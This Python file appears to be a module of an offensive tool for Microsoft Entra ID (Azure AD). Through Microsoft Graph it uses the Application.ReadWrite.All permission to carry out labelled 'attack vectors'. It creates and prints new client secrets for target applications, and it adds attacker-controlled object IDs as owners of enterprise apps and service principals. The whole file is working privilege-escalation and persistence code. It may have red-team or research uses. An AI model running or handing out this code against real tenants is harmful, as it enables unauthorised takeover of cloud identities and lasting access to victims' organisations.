import requests
import colorama
from colorama import Fore, Style


def ApplicationRW_Vectors(request_headers, AppRWSettings):
    print()
    print("Application.ReadWrite.All - Allows the app to read all applications and service principals without a "
          "signed-in user.")
    print()
    try:
        print("Attack vector - create a new app's secret.")
        print("Pay attention that it may not appear in the gui (it may take some time), but you will still be able to use "
              "it with the creds of SP's object id:secret")
        for sp in AppRWSettings['sp']:
            create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp + "/addPassword"

            message_obj = {"passwordCredential": {"displayName": AppRWSettings["dn"]}}

            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            text = result.json()
            secret = text['secretText']
            print("")
            print("Got secret: (" + str(result.status_code) + ")")
            print(Fore.GREEN + '\033[1m' + secret + '\033[0m')
            print(Style.RESET_ALL)
    except:
        pass
    try:
        print()
        print("Attack vector - change owner of enterprise app.") # deal with One or more added object references already exist for the following modified properties: 'owners'
        for sp in AppRWSettings['addOwnerToEA']:
            create_message_URL = "https://graph.microsoft.com/v1.0/servicePrincipals/" + sp + "/owners/$ref"
            for attacker in AppRWSettings['attacker']:
                message_obj = {
                    "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/" + attacker
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
                text = result.text
                print(text)
                if result.status_code == 204:
                    create_message_URL = "https://graph.microsoft.com/v1.0/servicePrincipals/" + sp
                    result = requests.get(create_message_URL, headers=request_headers)
                    res = result.json()
                    print(Fore.GREEN + '\033[1m added ' + attacker + ' to ' + res['appDisplayName'] + ' (enterprise app). \033[0m') # translate to app name
                    print(Style.RESET_ALL)
    except:
        pass

    print()
    try:
        print("Attack vector - change owner of sp.") # deal with One or more added object references already exist for the following modified properties: 'owners'
        for sp in AppRWSettings['addOwnerToSP']:
            create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp + "/owners/$ref"
            for attacker in AppRWSettings['attacker']:
                message_obj = {
                    "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/" + attacker
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
                text = result.text
                print(text)
                if result.status_code == 204:
                    create_message_URL = "https://graph.microsoft.com/v1.0/applications/" + sp
                    result = requests.get(create_message_URL, headers=request_headers)
                    res = result.json()
                    print(Fore.GREEN + '\033[1m added ' + attacker + ' to ' + res['displayName'] + ' (service principals). \033[0m') # translate to app name
                    print(Style.RESET_ALL)
    except:
        pass